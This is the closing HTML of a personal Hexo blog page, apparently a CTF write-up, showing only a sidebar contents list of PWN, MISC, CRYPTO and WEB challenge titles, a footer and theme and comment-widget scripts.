href="#PWN"><span class="nav-number">2.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#babyheap"><span class="nav-number">2.1.</span> <span class="nav-text">babyheap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyrop"><span class="nav-number">2.2.</span> <span class="nav-text">babyrop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EasyShellcode"><span class="nav-number">2.3.</span> <span class="nav-text">EasyShellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EasyStack"><span class="nav-number">2.4.</span> <span class="nav-text">EasyStack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Box"><span class="nav-number">2.5.</span> <span class="nav-text">Box</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Soso-easy-pwn"><span class="nav-number">2.6.</span> <span class="nav-text">Soso_easy_pwn</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">3.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#快乐游戏题"><span class="nav-number">3.1.</span> <span class="nav-text">快乐游戏题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hidden-secret"><span class="nav-number">3.2.</span> <span class="nav-text">Hidden secret</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EasyBox"><span class="nav-number">3.3.</span> <span class="nav-text">EasyBox</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#信号不好我先挂了"><span class="nav-number">3.4.</span> <span class="nav-text">信号不好我先挂了</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#puzzle"><span class="nav-number">3.5.</span> <span class="nav-text">puzzle</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Think"><span class="nav-number">3.6.</span> <span class="nav-text">Think</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#亲爱的"><span class="nav-number">3.7.</span> <span class="nav-text">亲爱的</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#无限迷宫"><span class="nav-number">3.8.</span> <span class="nav-text">无限迷宫</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CRYPTO"><span class="nav-number">4.</span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ECC和AES基础"><span class="nav-number">4.1.</span> <span class="nav-text">ECC和AES基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#不仅仅是RSA"><span class="nav-number">4.2.</span> <span class="nav-text">不仅仅是RSA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一句话加密"><span class="nav-number">4.3.</span> <span class="nav-text">一句话加密</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">5.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#帮赵总征婚"><span class="nav-number">5.1.</span> <span class="nav-text">帮赵总征婚</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#简单的备忘录"><span class="nav-number">5.2.</span> <span class="nav-text">简单的备忘录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#checkin"><span class="nav-number">5.3.</span> <span class="nav-text">checkin</span></a></li></ol></li></ol></div>
            

          </div>
        </div>
      <!--/noindex-->
      

      

    </div>
  </aside>
  


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2020</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Critizero</span>

  

  
</div>


  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.0.1</div>




        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

    

    
  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>














  
    
    
  
  <script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>













  
  <script src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>


  


  <script src="/js/src/utils.js?v=7.0.1"></script>

  <script src="/js/src/motion.js?v=7.0.1"></script>



  
  


  <script src="/js/src/affix.js?v=7.0.1"></script>

  <script src="/js/src/schemes/pisces.js?v=7.0.1"></script>



  
  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
<script src="/js/src/post-details.js?v=7.0.1"></script>



  


  <script src="/js/src/next-boot.js?v=7.0.1"></script>


  
  
  

<script src="//cdn1.lncld.net/static/js/3.11.1/av-min.js"></script>



<script src="//unpkg.com/valine/dist/Valine.min.js"></script>

<script>
  var GUEST = ['nick', 'mail', 'link'];
  var guest = 'nick,mail,link';
  guest = guest.split(',').filter(function(item) {
    return GUEST.indexOf(item) > -1;
  });
  new Valine({
    el: '#comments',
    verify: false,
    notify: false,
    appId: 'Klct3z761V5olFDdNX9DxLmo-gzGzoHsz',
    appKey: '5NxGMcgsdFe8Me8hni8wIYHB',
    placeholder: 'Just comment here',
    avatar: 'mm',
    meta: guest,
    pageSize: '10' || 10,
    visitor: false
  });
</script>




  


  




  

  

  

  

  

  

  

  

  

  

  

  

  

</body>
</html>
